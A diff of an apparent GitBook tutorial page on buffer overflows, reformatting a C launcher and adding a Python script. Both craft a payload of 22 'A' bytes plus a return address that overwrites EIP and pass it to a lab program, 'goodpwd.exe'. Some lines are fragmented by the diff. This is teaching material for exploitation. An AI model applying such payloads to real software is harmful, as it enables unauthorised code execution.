@@ -1,20 +1,19 @@
 # e - Buffer Overflows
 
-\#include #include
 
-int main(int argc, char \*argv\[]) { char command\[256]; char parameter\[128];
 
+{% code overflow="wrap" lineNumbers="true" %}
+```c
+#include
+int main(int argc, char *argv[]) { char command[256]; char parameter[128];
 memset(parameter,0x41,22); // fill the parameter with 'A' character
-
 // now modify the location which overwrites the EIP
-
-parameter\[22]= 0x48; parameter\[23]= 0x15; parameter\[24]= 0x40; parameter\[25]= 0x00;
-
-parameter\[26] = 0 ; /\* null terminate the parameter so as previous frames are not overwritten \*/
-
+parameter[22]= 0x48; parameter[23]= 0x15; parameter[24]= 0x40; parameter[25]= 0x00;
+parameter[26] = 0 ; /* null terminate the parameter so as previous frames are not overwritten */
 strcpy(command , "goodpwd.exe "); strcat(command, parameter);
-
 printf("%s\n",command);
+```
+{% endcode %}
 
 system(command); /\* execute the command \*/ return 0; }The term "buffer" is used to refer to any area in memory where more than one piece of data is stored. An overflow occurs when we try to fill more data than the buffer can handle. Buffer Overflow is a condition where a function attempts to copy more data into a buffer than it can hold.
 
@@ -184,6 +183,19 @@ int main(int argc, char *argv[])
 ```
 {% endcode %}
 
+{% code overflow="wrap" lineNumbers="true" %}
+```python
+# we can use this python helper script also.
+import os
+
+payload = "\x41" * 22
+payload += "\x48\x15\x40"
+command = "goodpwd.exe %s" % payload
+
+os.system(command)
+```
+{% endcode %}
+
 <figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>23</p></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption><p>24</p></figcaption></figure>
@@ -197,3 +209,4 @@ int main(int argc, char *argv[])
 <figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption><p>28</p></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption><p>29</p></figcaption></figure>
+
